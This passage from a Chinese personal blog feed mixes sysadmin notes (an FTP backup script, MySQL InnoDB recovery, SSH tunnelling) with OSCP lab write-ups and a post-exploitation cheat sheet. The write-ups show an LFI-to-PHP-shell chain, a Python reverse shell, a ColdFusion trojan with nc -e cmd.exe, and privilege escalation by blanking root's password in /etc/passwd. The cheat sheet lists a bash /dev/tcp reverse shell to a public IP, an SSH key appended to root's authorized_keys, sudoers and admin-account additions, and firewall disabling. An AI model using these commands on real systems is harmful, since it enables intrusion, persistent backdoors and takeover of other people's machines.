“:” -f 2)<br>FTPPORT=$(cat /backup/config | grep “FTPPORT” | cut -d “:” -f 2)<br>USERPASSWD=$(cat /backup/config | grep “USERPASSWD” | cut -d “:” -f 2)<br>databaseuser=$(cat /backup/config | grep “databaseuser” | cut -d “:” -f 2)<br>databasepass=$(cat /backup/config | grep “databasepass” | cut -d “:” -f 2)<br>sdir=$(cat /backup/config | grep “sdir” | cut -d “:” -f 2)<br>dir1=$(cat /backup/config | grep “dir1” | cut -d “:” -f 2)<br>databasename1=$(cat /backup/config | grep “databasename1” | cut -d “:” -f 2)</p><p>date=`date +%Y%m%d`</p><p>echo -e “\033[31m +++++开始备份网页文件数据+++++ \033[0m”</p><p>cd /<br>tar -cvf $dir1”_“$date.tar $dir1 &gt;&gt; /dev/null</p><p>echo -e “\033[31m +++++开始上传网页文件数据+++++ \033[0m”</p><p>ftp -A -n&lt;&lt;EOF<br>open $FTPIP $FTPPORT<br>user $USERPASSWD<br>cd $sdir<br>lcd /<br>prompt<br>mput $dir1”_“$date.tar<br>close<br>bye<br>EOF<br>echo -e “\033[31m +++++上传完成，清理环境+++++ \033[0m”<br>rm -rf $dir1”_“$date.tar<br>echo -e “\033[31m +++++开始备份数据库数据+++++ \033[0m”<br>mysqldump -u$databaseuser -p$databasepass -h127.0.0.1 $databasename1 &gt; /$databasename1”_“$date.dump<br>echo -e “\033[31m +++++开始上传数据库数据+++++ \033[0m”<br>ftp -A -n&lt;&lt;EOF<br>open $FTPIP $FTPPORT<br>user $USERPASSWD<br>cd $sdir<br>lcd /<br>prompt<br>mput $databasename1”_“$date.dump<br>close<br>bye<br>EOF<br>echo -e “\033[31m +++++数据上传完成，清理数据+++++ \033[0m”<br>rm -rf $databasename1”_“$date.dump<br>echo -e “\033[32m +++++日志已保存到/backup/+++++ \033[0m”</p><p>else<br>echo -e “\033[32m +++++安装前置环境+++++ \033[0m”<br>if [[ -f /etc/redhat-release ]]; then<br>release=”centos”<br>systemPackage=”yum”<br>elif grep -Eqi “debian” /etc/issue; then<br>release=”debian”<br>systemPackage=”apt”<br>elif grep -Eqi “ubuntu” /etc/issue; then<br>release=”ubuntu”<br>systemPackage=”apt”<br>elif grep -Eqi “centos|red hat|redhat” /etc/issue; then<br>release=”centos”<br>systemPackage=”yum”<br>elif grep -Eqi “debian” /proc/version; then<br>release=”debian”<br>systemPackage=”apt”<br>elif grep -Eqi “ubuntu” /proc/version; then<br>release=”ubuntu”<br>systemPackage=”apt”<br>elif grep -Eqi “centos|red hat|redhat” /proc/version; then<br>release=”centos”<br>systemPackage=”yum”<br>fi<br>$systemPackage -y install ftp<br>$systemPackage -y install mysqldump</p><p>echo “请输入自动备份任务的执行周期(以天为单位):”<br>read -p “自动备份周期天数:” day<br>echo “请输入你的FTP服务器IP地址(例如182.148.157.246):”<br>read -p “FTP服务器IP:” FTPIP<br>echo “请输入你的FTP服务器端口(例如21):”<br>read -p “FTP服务器端口:” FTPPORT<br>echo “请输入你的FTP服务器的用户名和密码(例如admin password):”<br>read -p “FTP用户名密码:” USERPASSWD<br>echo “请输入你的数据库用户名(例如root):”<br>read -p “数据库用户名:” databaseuser<br>echo “请输入你的数据库密码(例如password):”<br>read -p “数据库密码:” databasepass<br>echo “请输入你想要保存文档到FTP服务器的何位置(例如/share/backup):”<br>read -p “FTP服务器路径:” sdir<br>echo “请输入你需要备份的目录(例如/root/data):”<br>read -p “备份目录路径:” dir1<br>echo “请输入你需要备份的数据库名(例如wordpress):”<br>read -p “数据库名称:” databasename1</p><p>mkdir /backup<br>touch /backup/config</p><p>echo “day:”$day &gt;&gt; /backup/config<br>echo “FTPIP:”$FTPIP &gt;&gt; /backup/config<br>echo “FTPPORT:”$FTPPORT &gt;&gt; /backup/config<br>echo “USERPASSWD:”$USERPASSWD &gt;&gt; /backup/config<br>echo “databaseuser:”$databaseuser &gt;&gt; /backup/config<br>echo “databasepass:”$databasepass &gt;&gt; /backup/config<br>echo “sdir:”$sdir &gt;&gt; /backup/config<br>echo “dir1:”$dir1 &gt;&gt; /backup/config<br>echo “databasename1:”$databasename1 &gt;&gt; /backup/config</p><p>echo -e “\033[32m +++++初始化信息已保存到/backup/config+++++ \033[0m”</p><p>cp $0 /backup/autobackup.sh</p><p>echo “* * */“$day” * * /bin/bash /backup/autobackup.sh” &gt;&gt; /etc/crontab<br>/etc/rc.d/init.d/crond restart</p><p>echo -e “\033[32m +++++计划任务已添加+++++ \033[0m”</p><p>bash $0<br>fi</p><p>暂时只支持redhat系</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali校验数字签名失败</title>
      <link href="42a0fbbc8757/"/>
      <url>42a0fbbc8757/</url>
      
        <content type="html"><![CDATA[<p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a> | apt-key add</p>]]></content>
      
      
      <categories>
          
          <category> kali运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.39 LEFT TURN攻略</title>
      <link href="5cd0156a0876/"/>
      <url>5cd0156a0876/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180528141533.png"></p><p>nmao扫描一下，发现只开放了3个端口。</p><p>查看下网页内容。nikto扫描一哈</p><p><a href="http://10.11.1.39/otrs/index.pl">http://10.11.1.39/otrs/index.pl</a></p><p><img src="/images/2-2.png"></p><p>账户名可通过查阅manuel得知为root@localhost  <a href="http://doc.otrs.com/doc/manual/admin/4.0/en/html/first-login.html">http://doc.otrs.com/doc/manual/admin/4.0/en/html/first-login.html</a></p><p>密码猜出为otrs</p><p>登陆到后台</p><p><a href="https://packetstormsecurity.com/files/146038/OTRS-5.0.x-6.0.x-Remote-Command-Execution.html">https://packetstormsecurity.com/files/146038/OTRS-5.0.x-6.0.x-Remote-Command-Execution.html</a></p><p>发现otrs5存在一个RCE漏洞。</p><p><a href="http://10.11.1.39/otrs/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework;#">http://10.11.1.39/otrs/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework;#</a></p><p><img src="/images/1-2.png"><img src="/images/2-3.png"></p><p>改成我们想要执行的恶意代码的内容。</p><p>nc -lvp 443</p><p>访问<a href="http://10.11.1.39/otrs/index.pl?Action=AdminPGP">http://10.11.1.39/otrs/index.pl?Action=AdminPGP</a></p><p>得到reverse shell</p><p><img src="/images/3-2.png"></p><p>linuxprivchecker扫描一波，发现普通用户可以写入的文件中存在/etc/passwd</p><p><img src="/images/4-3.png"></p><p>没啥好说的</p><p>echo root::0:0:root:/root:/bin/bash &gt; /etc/passwd</p><p>把root用户的密码字段从x替换为空白，就等于说删除了root用户的密码。</p><p>然后直接su</p><p>就是root用户了</p><p><img src="/images/5-2.png"></p><p>root shell get</p><p><strong>proof.txt</strong> 1dcca23355272056f04fe8bf20edfce0</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.35 PAIN攻略</title>
      <link href="37ed5f52d236/"/>
      <url>37ed5f52d236/</url>
      
        <content type="html"><![CDATA[<p>PAIN这台机子是真的挺痛苦的</p><p>先感谢OS-19168为我提供了宝贵的信息。</p><blockquote><p>参考链接:<a href="https://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/">https://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/</a></p></blockquote><p>首先NMAP扫一下，发现这台机子只开了443和22端口。</p><p><a href="https://10.11.1.35访问一下,发现存在一个未搭建完毕的web站点./">https://10.11.1.35访问一下，发现存在一个未搭建完毕的web站点。</a></p><p>观察源码，东看西看一下</p><p><img src="/images/1-1.png"><img src="/images/2-1.png"></p><p>发现了几个很敏感的链接 <a href="https://10.11.1.35/section.php?page=alldocs">https://10.11.1.35/section.php?page=alldocs</a></p><p>一眼看上去就有LFI漏洞，因为alldocs不存在.php所以需要%00来截断一下</p><p><a href="https://10.11.1.35/section.php?page=../../../../../../../etc/passwd%00">https://10.11.1.35/section.php?page=../../../../../../../etc/passwd%00</a></p><p><img src="/images/3-1.png"></p><p>果不其然哈。</p><p>后来按照常规思路，是要向apache日志文件里写恶意代码，但是过程中有很多问题。</p><p>第一点，无论是nc还是telnet，向443端口倒恶意代码的时候，服务器端都没返回信息，实际上是因为ssl的原因没有导入成功的。</p><p>所以实际上需要burpsuit带headers来导入。</p><p>第二点，日志文件不在常规目录，或者说apache没有权限访问。所以无法包含日志文件。</p><p>这边参考了OS-19168提供的文章，发现了一个必须要有Linux内核知识才了解的骚套路。</p><p>Linux内核通过每个进程ID的proc条目向用户模式输出关于单个进程的一些有趣信息。 它还创建了一个名为“self”的条目，它提供了一个可以轻松访问其自己的流程信息的进程。</p><p>也就是说，网页服务器日志信息是通过一个进程不断地写入到日志文件的，而万物皆为文件的linux系统，这个进程也可以被当成文件访问。</p><p>一般来说这些进程的地址是/proc/self/fd/xxxxx/</p><p>我们可以尝试包含这些个进程文件，当然几号进程不可能知道，只能一个一个去试，这台机子的网页日志进程大概就是12，13的样子。</p><p><img src="/images/4-2.png"></p><p>可以看到，这次12号进程就是网页日志文件。</p><p>我们通过Burpsuit向他发送php恶意代码</p><?php passthru($\_GET\['cmd'\]);?><p><img src="/images/5-1.png"></p><p>发送完成之后，就能给目标服务器发送cmd了</p><p><a href="https://10.11.1.35/section.php?page=/proc/self/fd/13/%00&amp;cmd=python">https://10.11.1.35/section.php?page=/proc/self/fd/13/%00&amp;cmd=python</a> -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.11.0.198”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><p>我们这边给目标服务器发送一个python的返回shell的代码。</p><p><img src="/images/6-2.png"><img src="/images/7-2.png"></p><p>可以看到成功的拿了web shell。</p><p>接下来就是提权，进入到/tmp目录里下载<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/linuxprivchecker.zip">linuxprivchecker</a>，然后运行一下，扫出发现了俩提权洞，实际上是同一个漏洞。一个是sh脚本，一个是c语言的程序。</p><blockquote><p>The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system - 2.6 UDEV &lt; 141 Local Privilege Escalation Exploit || <a href="http://www.exploit-db.com/exploits/8572">http://www.exploit-db.com/exploits/8572</a> || Language=c - 2.6 UDEV Local Privilege Escalation Exploit || <a href="http://www.exploit-db.com/exploits/8478">http://www.exploit-db.com/exploits/8478</a> || Language=bash</p></blockquote><p>这边用这个sh脚本文件，c的那个好像有问题。</p><p>因为目标机器上没安装gcc，所以必须手动离岸编译，很鸡儿麻烦。</p><p>另外脚本文件得手动改下，不知道是版本是版本问题还是什么，gcc命令有些参数反了。<a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/8478.zip">8478</a>&lt;&lt;这边是我修改好的文件。</p><p>把所有东西在攻击机上编译好，脚本会在/tmp文件生成三个文件，一个suid，一个udev，一个libno_ex.so.1.0</p><p>把这三个文件下载到目标机器上的同目录下，权限改好，然后再目标机器上执行</p><p>cat /proc/net/netlink查看一下udev的进程PID，把PID作为参数</p><p><img src="/images/11.png"></p><p>下载三个文件</p><p><img src="/images/8-2.png"> <img src="/images/9.png"> <img src="/images/10.png"></p><p>执行权限提升脚本文件。</p><p><img src="/images/12.png"></p><p>得等好一会才能出来权限。</p><p><img src="/images/13.png"></p><p><img src="/images/14.png"></p><p>get root shell√</p><p><strong>proof.txt</strong> 3f7d652a3efb59d0631771f65c65ba07</p><p>HELL OF A RIDE!!!</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.31 RALPH攻略</title>
      <link href="c461c41662ed/"/>
      <url>c461c41662ed/</url>
      
        <content type="html"><![CDATA[<p><strong>参考链接</strong>：<a href="http://www.madirish.net/59">http://www.madirish.net/59</a></p><p>NMAP扫描结果</p><p><img src="/images/1.png"></p><p>有80先看下http啥内容</p><p><img src="/images/2.png"></p><p>源码以及弱密码都没有成效。nikto扫描也没有啥结果。</p><p>尝试基于smb协议的各种漏洞，都不成功。</p><p>nmap的NSE脚本 nbtscan nmblookup enum4linux smbclient 扫一下目标机器的smb协议。</p><p><img src="/images/4-1.png"></p><p>nmblookup -A 10.11.1.31</p><p><img src="/images/6-1.png"></p><p>enum4linux 10.11.1.31</p><p><img src="/images/7-1.png"></p><p>nmap 10.11.1.31 -p 139,445 –script=smb-enum-shares</p><p><img src="/images/8-1.png"></p><p>可以看到有一个wwwroot的贡献，当前匿名用户是可读权限！</p><p>smbclient -L \\RALPH -I 10.11.1.31 -N</p><p><img src="/images/3.png"></p><p>知道了有一个叫wwwroot的共享之后，敏感名字马上看一下</p><p>smbclient //RALPH/wwwroot -I 10.11.1.31 -N</p><p><img src="/images/5.png"></p><p>发现存在base-login.asp和login-off.asp的txt完整源码版本。</p><p>浏览器看一下。发现login-off.asp.txt里记录了ms-sql数据库的密码。</p><p>cnn.open “PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb”</p><p>打开msfconsole</p><p>use exploit/windows/mssql/mssql_payload</p><p>填上数据库和密码，直接exploit。</p><p>直接get system shell√</p><p><strong>proof.txt</strong> 26b4cb0930a3e3be4da8e9d738607427</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次灾难性的mysql数据恢复</title>
      <link href="84aa0081eb21/"/>
      <url>84aa0081eb21/</url>
      
        <content type="html"><![CDATA[<p>2018年5月21日，吃饱了没事干，想搞邮件服务器，百度找到个叫U-mail的东西。</p><p>进了官网，感觉挺好，脑子抽了，直接生产环境上装了，发现很垃圾，卸载。</p><p>rpm一看，包很多，写了个脚本一键删了。</p><p><img src="/images/1.png"> <img src="/images/2.png"></p><p>删完重启，心想生产环境不会被他弄坏吧。一看wp，完蛋了，打不开了。</p><p>看了下本地服务器上的数据库备份。发现最新的备份是3月8号的。</p><p><img src="/images/3.png"></p><p><img src="/images/emote.png">我4，5月份写了那么多笔记啊！！！！！！！</p><p>开始想办法恢复数据。</p><p>systemstl status mysql</p><p>发现mysql这个服务都不存在了，完蛋。</p><p>cd /usr/local/mysql</p><p>看一下物理目录还在吗，能进去，还在。</p><p>数据库的数据文件一般保存在/usr/local/mysql/var/数据库名字 内，进去看了一下，文件都在。</p><p>.idb格式的是数据内容  .frm格式的是数据结构</p><p>现在要做的就是把这些东西恢复成数据库的数据。</p><p>换了台机子，重新装了mysql同版本，进了/usr/local/mysql/var 把原机子上的数据库源文件复制进去，重启数据库，数据库直接报错。</p><p>网上查了下，说是改一下/etc/my.cnf文件，添加innodb_force_recovery=1-6 就可以了。试了一遍，不行。痛苦。</p><p>后来问了下猫叔。猫叔给了个链接，并祝我好运。</p><p><img src="/images/4.png"></p><p><a href="https://www.cnblogs.com/xj2015/p/7479999.html">https://www.cnblogs.com/xj2015/p/7479999.html</a></p><p>简述一下操作流程。。。</p><p>首先查看一下/etc/my.cnf中的innodb_file_per_table值是不是1</p><p>如果是1的话有可能用自动化工具修好，不是1的话只能手动修复。</p><p>看了下我的，发现是1，试一下自动工具。</p><p><a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/mysqlibd.zip">mysqlibd</a></p><p>此工具需要Windows环境 .net4.x版本、MySQL5.6的最新版本。</p><p>mysql5.6.40  <a href="http://125.71.5.35:2333/index.php?share/file&amp;user=1&amp;sid=bagrDdQw">http://125.71.5.35:2333/index.php?share/file&amp;user=1&amp;sid=bagrDdQw</a></p><p>工具使用方式：</p><blockquote><p>InnoDBRestore <username> <password> <port> <srcdir> <destDB></p><p>例如</p><p>InnoDBRestore root pass 3306 c:\dbcopy my_database</p></blockquote><p>祝好运吧。如果运气好，无报错， c:\dbcopy 下的MyISAM和InnoDB数据都会被导入 my_database（my_database不需要提前创建）。</p><p>然而你可能会和我一样，遇上了数据错误（天知道为什么），导入过程可能会报错。这些报错很可能是连接被关闭</p><blockquote><p>restoring : wp_posts.frm</p><p>unknown error:MySql.Data.MySqlClient.MySqlException (0x80004005): Fatal error encountered during command execution. —&gt; MySql.Data.MySqlClient.MySqlException (0x80004005): Fatal error encountered attempting to read the resultset. —&gt; MySql.Data.MySqlClient.MySqlException (0x80004005): Reading from the stream has failed. —&gt; System.IO.IOException: 无法从传输连接中读取数据: 远程主机强迫关闭了一个现有的连接。。 —&gt; System.Net.Sockets.SocketException: 远程主机强迫关闭了一个现有的连接。</p></blockquote><p>然后同时，查看数据库的err日志，可能会有类似以下报错：</p><blockquote><p>InnoDB: Error: trying to access page number 1372160 in space 1, InnoDB: space name recovery1/wp_posts, InnoDB: which is outside the tablespace bounds. InnoDB: Byte offset 0, len 16384, i/o type 10. InnoDB: If you get this error at mysqld startup, please check that InnoDB: your my.cnf matches the ibdata files that you have in the InnoDB: MySQL server.</p></blockquote><p>由于InnoDB引擎遇上了异常，MySQL崩溃退出，导致连接断开。这种情况下，到MySQL的data目录下，删除刚才导入的数据库的文件夹以及ib_logfile0、ib_logfile1、ibdata1（也就是重置所有InnoDB引擎相关数据）。然后再启动MySQL。</p><p>将引发故障的表文件(ibd、frm)单独移出来，留作阶段2修复使用，再次执行InnoDBRestore，如再遇上故障重复以上步骤，直到工具不再报错为止。</p><p>使用mysqldump将表导出来。<strong>建议添加–skip-extended-insert参数以便数据检查，如果上面一切都顺利，无论是导入还是导出都没有任何报错，也需要仔细检查恢复出来的数据是否有异常（很大的负数、数据参杂乱码、不合理的日期等），有些情况下会有隐性损坏情况。如果没有，那么恭喜你数据就恢复完成了，不需要继续向下阅读了</strong></p><p>……然而你可能像我一样，导出时再次遇上相似故障</p><blockquote><p>ERROR 2013 (HY000): Lost connection to MySQL server during query</p></blockquote><p>查看err日志后，发现另一个原先看起来成功导入的ibd文件dump时由于数据错误也失败了，修改my.cnf，添加innodb_force_recovery=6。然后再重新启动，再次尝试dump查看是否成功，如成功需要仔细检查是否数据正确。如果连 innodb_force_recovery=6 也无法获得正确数据的话，只能跳过出故障的表，将其余正常的表导出。出故障的表通过第二阶段进行修复。</p><p>总的来说，我wp_posts这张表挂了，无法用自动工具修复，在数据库中想要查看这张表，数据库就会崩溃。</p><p>只能尝试手动修复这张表了。</p><p>要用到工具<a href="https://github.com/chhabhaiya/undrop-for-innodb">https://github.com/chhabhaiya/undrop-for-innodb</a> 并且要在有mysql环境的linux上运行。</p><p>安装undrop-for-innodb工具，只需要执行make命令进行编译，很简单也非常快。</p><p>该工具可用于很多 InnoDB 灾难性数据丢失场景的<strong>数据库救援</strong>。救援的意思是尽量恢复数据，通常需要这个工具的场合都是很糟糕的，运气好的情况下你或许能全部提取出。因此无论如何依然不能直接拷贝InnoDB数据库。p.s.今年1月此工具停止进一步开发了，很可惜</p><p>make编译后会在其目录生成以下可执行工具：</p><blockquote><p>c_parser innochecksum_changer stream_parser</p></blockquote><p>1.使用</p><blockquote><p>./stream_parser -f wp_posts.ibd</p></blockquote><p>拆出ibd文件结构</p><p>2.使用mysqlfrm拆出包含表结构的CREATE TABLE语句，在第一阶段 zcgonvh的工具里有一个Windows的MySqlFrm.exe亦可使用，这里以该工具为例。Linux的 mysqlfrm可以参考下面本文后杂记</p><blockquote><p>mysqlfrm <username> <password> <port> <srcdir> 例如： mysqlfrm root pass 3306 c:\dbcopy</p></blockquote><p>会在同目录下对每个frm文件生成一个.sql文件 内含创建表语句。<strong>注意该工具生成的CREATE TABLE语句不含分号，会对之后操作造成影响，需要在语句末尾添加一个分号</strong></p><p>3.拆出的ibd文件结构会存储在pages-wp_posts.ibd里。包含以下子目录：</p><blockquote><p>FIL_PAGE_INDEX：一般PAGE，依照其ID存放</p><p>FIL_PAGE_TYPE_BLOB： 如果遇上较大的数据（例如comments里有text类型的数据并且内容较多），InnoDB会使用BLOB类PAGE存储数据。<strong>需检查此目录是否有文件。如有，说明此表使用了BLOB，之后提取命令需要用-b参数指定此目录进行提取</strong></p></blockquote><p>按照步骤1拆分ibdata1，然后编辑recover_dictionary.sh脚本里的mysql命令行 在后面加上 -u root -p密码</p><p>然后执行此脚本，会将SYS系列表导入test数据库</p><p>使用mysql命令行进入<strong>test</strong>数据库后，执行：</p><p>mysql&gt; select * from SYS_TABLES where NAME like “%/wp_posts”;</p><p><img src="/images/5.png"></p><p>此table的ID为116，然后执行</p><p>mysql&gt;  SELECT * FROM SYS_INDEXES where table_id=116;</p><p><img src="/images/6.png"></p><p>即可获得主键的index_id为218，因此对应的page是：pages-wp_posts.ibd/FIL_PAGE_INDEX/00000000<strong>00000218</strong>.page。</p><p><img src="/images/7.png"></p><p>如果没有ibddata1的情况下就没法用工具判断id了，只能一个一个猜了</p><p>使用c_parser命令对每个page尝试提取。此表数据结构是COMPACT，因而使用参数-5。如果是MYSQL5.6以上的格式用-6。不确定的话5和6都试下</p><p>本例BLOB目录下有文件，需要-b参数指定BLOB目录以确保数据完整。</p><p>步骤2得到的表结构定义（CREATE TABLE）放在 wp_posts.frm.sql</p><p>将输出指向到less以便阅读：</p><blockquote><p>[root@Test undrop-for-innodb]#./c_parser <strong>-5</strong>f ./pages-wp_posts.ibd/FIL_PAGE_INDEX/<strong>XXXXX</strong>.page <strong>-b</strong> ./pages-wp_posts.ibd/FIL_PAGE_TYPE_BLOB/ -t ./<strong>wp_posts.frm.sql</strong> | less</p></blockquote><p>XXXXX替换成具体的page编号，建议从头开始尝试（对两个有类似问题的表修复的结果似乎暗示第一个的成功概率最高），<strong>直到获得了明显正确的结果（日期正确 大部分数据正常 Records list为Valid）</strong></p><p>c_parser会将tsv数据dump到标准输出管道，并且很贴心的将对应数据恢复SQL命令特意单独输出到了错误输出（某个N年未更新的工具还需要自行构建命令导入）。可以使用以下命令对含有正确数据索引的page做最终导出：</p><blockquote><p>./c_parser -5f pages-wp_posts.ibd/FIL_PAGE_INDEX/0000000000224178.page -b pages-wp_posts.ibd/FIL_PAGE_TYPE_BLOB/ -t wp_posts.frm.sql <strong>&gt; wp_posts 2&gt; wp_posts.sql</strong></p></blockquote><p>会得到</p><p>wp_posts：提取出来的tsv格式数据 wp_posts.sql：将tsv导入数据库的SQL命令</p><p>编辑器打开这两个文件，可以看到wp_posts.sql实际上保存了原先数据表的结构</p><p>wp_posts则是保存了具体数据。</p><p>我们需要将这两个文件挪到/tmp文件夹（规避权限问题），然后修改 wp_posts.sql 内的LOAD DATA LOCAL INFILE路径，使之符合新的tsv文件路径。</p><p>之后要做的就很简单了</p><p>新建一个和原先表结构完全一样的表，然后SOURCE /tmp/wp_posts.sql;就能将数据导进数据库了。</p><p>最后dump出来，就是标准的SQL格式了。</p><p><img src="/images/8.png"></p><p>能正常访问了！</p><p>弄完一想，如果以后渗透的时候，机子权限有了，但是没数据库权限，可以把idb文件和frm文件搞下来，然后离线脱裤！不错不错:)</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.10 Mike攻略</title>
      <link href="cc22c612ebf9/"/>
      <url>cc22c612ebf9/</url>
      
        <content type="html"><![CDATA[<p>nmap扫描结果</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180514235847.png"></p><p>只对外开放了80端口</p><p>Nikto -h 10.11.1.10扫描一下</p><p>发现存在Adobe coldfusion8</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180515000035.png"></p><p>coldfusion 存在lfi漏洞，可以直接读取到管理员密码。</p><p>admin:pass123</p><p>发现可以通过计划任务的方式，上传特定的文件到web目录内。似乎只可以上传cfm格式的</p><p>谷歌发现存在相应的cfm木马 <a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/cfexec-with-upload.zip">cfexec-with-upload</a></p><p>下载之后通过计划任务上传到web目录</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180515000411.png"></p><p>记得一定勾选上Save output to a file！！！.</p><p>输入cfm木马地址，并访问</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180515000542.png"></p><p>上传<a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/nc.zip">nc</a></p><p>注意cfexec.cfm这个木马是规定了上传的文件都是上传到C:\目录下的！浪费了好多时间就是因为没有仔细看cfm源码！</p><p>上传完成之后</p><p>先在攻击机上开一个监听端口，再在</p><p>Command输入 C:\nc.exe</p><p>Option输入  -vn 10.11.0.198 4444 -e cmd.exe</p><p>反弹自己的cmd shell给攻击机</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180515000921.png"></p><p>成功GET SHELL！</p><p>proof.txt <strong>a416a831fddf36aa8c01ba0674ca7bf8</strong></p><p>彩蛋：</p><p><img src="/images/20180514234936.png"></p><p>I did try hard  :)</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>提权后处理后渗透操作</title>
      <link href="54a77c1fbc55/"/>
      <url>54a77c1fbc55/</url>
      
        <content type="html"><![CDATA[<p>Windows</p><p>net user <username> <password> /add             //添加用户</p><p>net localgroup administrators <username> /add           //将用户加入administrators权限组</p><p>net user guest /active:yes  //激活guest账户</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  //开启远程桌面连接服务,会丢失连接</p><p>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>Windows防火墙<br>关闭<br>NetSh Advfirewall set allprofiles state off<br>打开<br>NetSh Advfirewall set allprofiles state on<br>检查状态<br>Netsh Advfirewall show allprofiles</p><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;$username ALL=(ALL) ALL&quot; &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -qO- bench.sh | bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/45.141.100.153/1337 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCumR+RaDtGBi8P3SP7OzWTC7VIpH84JBYJLFXQzgzqSUVJQxs9BXh5tVuiQ7fjb6kc00ysqhiC9B221Xv5ZwHGqtbzCtV7GU1Ml2oQlt+Y1DgnOyO+op76bIIOfT7kKm6pOGlm3Jy7CBJEKqxJsYQ+TL5Mu7cWzsLVpddHnYRvOxS8rbINDq+GQUn/92HHTjRgcQa7fv/EqA/NcRa/ah/VMjHpPzKmvn/dCULCVd4PpmrFUgYR8Bzov/GDsxr1CGxt3bSweB+MuX/JvV4ZdjRfgTdraWJbPvKDOhzMCkVpiBFUf7JmO6KBEaEfatXqRbIT4hF+ZwOBN/rBWOXSCxgr&quot; &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH反向代理内网穿透</title>
      <link href="6430f77fda1b/"/>
      <url>6430f77fda1b/</url>
      
        <content type="html"><![CDATA[<h1 id="Openssh-Windows穿透内网"><a href="#Openssh-Windows穿透内网" class="headerlink" title="Openssh  Windows穿透内网"></a>Openssh  Windows穿透内网</h1><h3 id="外网服务器端"><a href="#外网服务器端" class="headerlink" title="外网服务器端"></a>外网服务器端</h3><p>vim /etc/ssh/sshd_config</p><p>找到GatewayPorts把前面的#去掉 后面改成yes</p><p>systemctl restart sshd.service</p><p>配置好防火墙 开放vps的特定端口</p><p> </p><h3 id="内网服务器端"><a href="#内网服务器端" class="headerlink" title="内网服务器端"></a>内网服务器端</h3><p>安装<a href="http://wp.jinzz.cc/wp-content/uploads/2018/04/openssh.zip">openssh</a></p><p>ssh -C -g 外网服务器用户名@外网服务器ip -R 内网服务器端口:0.0.0.0:外网服务器端口 free -m -s30</p><h1 id="SSH-Linux穿透内网"><a href="#SSH-Linux穿透内网" class="headerlink" title="SSH  Linux穿透内网"></a>SSH  Linux穿透内网</h1><h3 id="外网服务器端-1"><a href="#外网服务器端-1" class="headerlink" title="外网服务器端"></a>外网服务器端</h3><p>vim /etc/ssh/sshd_config</p><p>找到GatewayPorts把前面的#去掉 后面改成yes</p><p>systemctl restart sshd.service</p><p>配置好防火墙 开放vps的特定端口</p><p> </p><h3 id="内网服务器端-1"><a href="#内网服务器端-1" class="headerlink" title="内网服务器端"></a>内网服务器端</h3><p>安装sshpass可以避免二次交互输入密码</p><p>yum -y install sshpass</p><p>sshpass -p “pass” ssh -fCNR 内网服务器端口:0.0.0.0:外网服务器端口 外网服务器用户名@外网服务器ip</p><p> </p><h3 id="KeepAlive"><a href="#KeepAlive" class="headerlink" title="KeepAlive"></a>KeepAlive</h3><p>ClientAliveInterval 60<br>ClientAliveCountMax 1</p><p>保持ssh连接稳定，可以在服务端/etc/ssh/sshd_config末尾插入上面两个KeepAlive的option</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
